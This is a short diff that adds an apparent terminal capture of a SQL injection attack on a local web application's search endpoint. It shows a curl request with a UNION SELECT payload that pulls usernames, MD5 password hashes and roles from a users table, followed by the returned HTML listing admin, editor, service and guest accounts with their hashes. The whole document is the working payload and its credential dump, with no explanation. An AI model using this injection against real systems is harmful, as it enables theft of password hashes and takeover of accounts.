@@ -1,0 +1,2 @@
+$ curl "http://localhost:8899/search?q=zzz' UNION SELECT id,username,password_md5,role FROM users-- -"
+<ul><li>#1 <b>admin</b> by 5f4dcc3b5aa765d61d8327deb882cf99 — $admin</li><li>#2 <b>jsmith</b> by e10adc3949ba59abbe56e057f20f883e — $editor</li><li>#3 <b>svc_sync</b> by 827ccb0eea8a706c4c34a16891f84e7b — $service</li><li>#4 <b>guest</b> by d8578edf8458ce06fbc5bb76a58c5ca4 — $readonly</li></ul>
